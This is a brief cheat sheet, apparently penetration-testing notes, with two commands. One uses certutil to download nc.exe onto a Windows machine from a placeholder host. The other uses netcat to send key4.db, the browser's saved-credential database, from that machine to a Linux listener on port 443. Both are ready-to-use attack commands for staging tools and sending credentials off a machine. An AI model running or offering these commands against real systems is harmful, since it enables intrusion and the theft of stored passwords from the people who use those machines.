### Download file in Windows Machine.

`certutil -urlcache -f http://<TARGET_IPADDRESS:<PORT>/nc.exe nc.exe`

### Transfer file from Windows Machine to Linux (netcat)

`nc -nv <TARGET_IPADDRESS <PORT> < key4.db (on windows machine)`

`nc -nvlp 443 > key4.db (on Linux Machine)`
